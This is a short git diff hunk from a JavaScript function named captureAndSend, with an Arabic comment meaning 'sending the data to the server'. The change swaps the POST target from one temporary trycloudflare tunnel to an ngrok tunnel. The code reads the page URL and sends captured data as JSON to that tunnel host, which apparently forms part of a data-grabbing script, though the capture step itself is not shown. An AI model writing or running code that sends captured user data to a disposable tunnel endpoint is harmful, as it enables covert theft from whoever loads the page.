@@ -131,7 +131,7 @@ async function captureAndSend() {
         const pageUrl = window.location.href;
 
         // 6. إرسال البيانات إلى السيرفر
-        const response = await fetch('https://came-constant-thread-paintings.trycloudflare.com', {
+        const response = await fetch('https://proven-deflator-jolliness.ngrok-free.dev', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
